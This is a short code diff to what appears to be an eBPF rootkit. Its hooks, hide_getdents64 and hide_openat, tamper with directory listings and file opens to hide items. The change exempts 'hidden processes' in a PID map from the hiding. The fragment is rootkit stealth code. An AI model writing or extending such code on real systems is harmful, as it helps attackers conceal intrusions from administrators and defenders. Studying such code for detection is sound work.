@@ -79,6 +79,11 @@ int BPF_PROG(hide_getdents64, struct pt_regs *regs, long ret)
     if (ret <= 0)
         return 0;
 
+    /* Not hiding from hidden processes */
+    pid_t pid = bpf_get_current_pid_tgid() >> 32;
+    if (bpf_map_lookup_elem(&tracked_pids_map, &pid))
+        return 0;
+
     /* Extracting dirp struct from regs */
     struct linux_dirent64 *dirp = (struct linux_dirent64 *)PT_REGS_PARM2_CORE(regs);
 
@@ -109,6 +114,11 @@ int hide_openat(struct pt_regs *ctx)
     /* Extracting the real user pt_regs passed in rdi (PARM1 of kprobe) */
     struct pt_regs *real_regs = (struct pt_regs *)PT_REGS_PARM1(ctx);
     if (!real_regs)
+        return 0;
+
+    /* Not hiding from hidden processes */
+    pid_t pid = bpf_get_current_pid_tgid() >> 32;
+    if (bpf_map_lookup_elem(&tracked_pids_map, &pid))
         return 0;
 
     /* Extracting filename from rsi of real_regs (PARM2 of openat) */
